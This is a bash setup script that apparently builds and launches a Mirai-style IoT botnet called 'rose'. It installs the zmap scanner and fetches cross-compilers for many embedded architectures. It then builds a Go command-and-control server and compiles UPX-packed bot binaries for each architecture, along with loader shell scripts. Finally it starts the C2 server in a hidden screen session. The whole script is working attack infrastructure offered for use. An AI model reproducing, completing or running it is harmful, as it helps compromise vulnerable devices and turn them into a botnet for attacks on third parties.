#!/bin/bash

clear
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

echo "Do you want update system? (y/n)"
read answer
clear

echo "Do you want to clean files? (y/n)"
read clean_answer
clear

if [ "$answer" == "${answer#[Yy]}" ] ;then
    echo "Updating system..."
    apt-get update -y
    apt-get upgrade -y

    echo "Installing dependencies..."
    apt-get install -y git build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev zmap snap python3 python3-pip screen nload
    snap install go --classic

    declare -A compilers
    compilers["cross-compiler-armv4l"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-armv4l.tar.gz"
    compilers["cross-compiler-armv4tl"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-armv4tl.tar.gz"
    compilers["cross-compiler-armv5l"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-armv5l.tar.gz"
    compilers["cross-compiler-armv6l"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-armv6l.tar.gz"
    compilers["cross-compiler-i486"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-i486.tar.gz"
    compilers["cross-compiler-i586"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-i586.tar.gz"
    compilers["cross-compiler-i686"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-i686.tar.gz"
    compilers["cross-compiler-m68k"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-m68k.tar.gz"
    compilers["cross-compiler-mips"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-mips.tar.gz"
    compilers["cross-compiler-mips64"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-mips64.tar.gz"
    compilers["cross-compiler-mipsel"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-mipsel.tar.gz"
    compilers["cross-compiler-powerpc"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc-440fp.tar.gz"
    compilers["cross-compiler-powerpc"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-powerpc.tar.gz"
    compilers["cross-compiler-sparc"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-sparc.tar.gz"
    compilers["cross-compiler-x86_64"]="http://landley.net/aboriginal/downloads/binaries/cross-compiler-x86_64.tar.gz"

    download_arch() {
        echo "$1 | Download"
        wget --no-check-certificate -O /tmp/$1.tar.gz ${compilers[$1]} >> /dev/null 2>&1
        echo "$1 | Extract & Install"
        tar -xzf /tmp/$1.tar.gz -C /usr/local >> /dev/null 2>&1
        echo "$1 | Remove"
        rm -rf /tmp/$1.tar.gz >> /dev/null 2>&1
    }

    # Download & Install Cross Compilers
    for compiler in "${!compilers[@]}"; do
        download_arch $compiler &
    done
    wait
fi

echo "Building cnc"
cd ../cnc/
go build -o cnc .
cd ../script/

echo "Building bot"
cd ../bot/script
chmod +x ./upx
make release

echo "Moving files"
cd $HOME
rm -rf $HOME/rose && mkdir $HOME/rose

mv $HOME/cnc/cnc $HOME/rose/
mv $HOME/cnc/bin $HOME/rose/
mv $HOME/cnc/data $HOME/rose/

mv $HOME/bot/script/build/rose.* $HOME/rose/bin/builds/
mv $HOME/bot/script/build/*.sh $HOME/rose/bin/
mv $HOME/script/cnc_loop.sh $HOME/rose/

if [ "$clean_answer" == "${clean_answer#[Yy]}" ] ;then
    echo "Cleaning up"
    rm -rf ./cnc
    rm -rf ./bot
    rm -rf $HOME/script
fi

echo "Done!"
screen -dmS cnc bash $HOME/rose/cnc_loop.sh